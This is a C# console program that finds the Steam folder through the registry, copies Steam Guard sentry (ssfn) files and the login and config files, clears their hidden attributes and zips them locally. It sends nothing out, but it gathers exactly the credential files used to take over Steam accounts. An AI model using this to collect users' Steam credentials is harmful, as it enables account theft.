using System;
using System.Collections.Generic;
using System.Linq;
using System.IO;
using System.IO.Compression;
using Microsoft.Win32;

namespace SteamGuardFiles
{
    class Program
    {
        /// <summary>
        /// General variables
        /// </summary>
        private static List<string> FilesToGet = new List<string>();
        

        /// <summary>
        /// Get Steam folder from registry
        /// </summary>
        /// <returns></returns>
        private static string GetSteamFolder()
        {
            /*Get registry key*/
            RegistryKey steamKey = Registry.CurrentUser.OpenSubKey(@"Software\Valve\Steam");

            /*Check if it's not null*/
            /*Maybe the user doesn't have steam installed*/
            if (steamKey != null)
            {
                /*Return the SteamPath SubKey*/
                return steamKey.GetValue("SteamPath").ToString();
            }

            /*Something failed, return empty*/
            return string.Empty;
        }


        /// <summary>
        /// Adds all requested files from a folder to the list
        /// </summary>
        /// <param name="DI">Specifies which folder to search</param>
        /// <param name="files">Specifies which files to get</param>
        static void AddFiles(DirectoryInfo DI, string[] files)
        {
            /*Get files from Directory (DI)*/
            FileInfo[] FI = DI.GetFiles();

            /*Get all ssf files from base folder*/
            foreach (var file in FI)
            {
                /*If current loop file is a file that we want*/
                if (files.Any(s => file.Name.Contains(s)))
                {
                    /*If the file exists, add it to the list of files to get*/
                    if (File.Exists(file.FullName))
                    {
                        FilesToGet.Add(file.FullName);
                    }
                }
            }
        }


        /// <summary>
        /// Main function
        /// </summary>
        /// <param name="args"></param>
        static void Main(string[] args)
        {
            /*Path variables*/
            string steamFolder  = GetSteamFolder();
            string newDirectory = Path.Combine(AppDomain.CurrentDomain.BaseDirectory, "SteamFiles");
            string newZip       = newDirectory + ".zip";

            /*Ensure that we found the steam folder*/
            if(string.IsNullOrEmpty(steamFolder))
            {
                /*Unable to fetch the Steam folder*/
                Console.WriteLine("Unable to find Steam folder. Not installed.");
                System.Threading.Thread.Sleep(1500);
                return;
            }

            /*Create folder to store items*/
            Directory.CreateDirectory(newDirectory);
            
            /*Get all the files from Base and Config folder*/
            AddFiles(new DirectoryInfo(steamFolder), new string[] { "ssf" });
            AddFiles(new DirectoryInfo(string.Format("{0}\\Config", steamFolder)), new string[] { "config", "SteamAppData", "loginusers" });

            /*Copy all files to our created directory*/
            foreach(string file in FilesToGet)
            {
                /*Load up new path and copy file*/
                string newFile  = Path.Combine(newDirectory, Path.GetFileName(file));
                File.Copy(file, newFile);

                /*Make sure file is not hidden*/
                FileInfo FI     = new FileInfo(newFile);
                FI.Attributes   = FileAttributes.Normal;
            }

            /*Delete an already existing Zip folder*/
            if (File.Exists(newZip))
            {
                File.Delete(newZip);
            }

            /*Zip up the new folder*/
            ZipFile.CreateFromDirectory(newDirectory, newZip);

            /*Delete the old folder*/
            Directory.Delete(newDirectory, true);
        }
    }
}
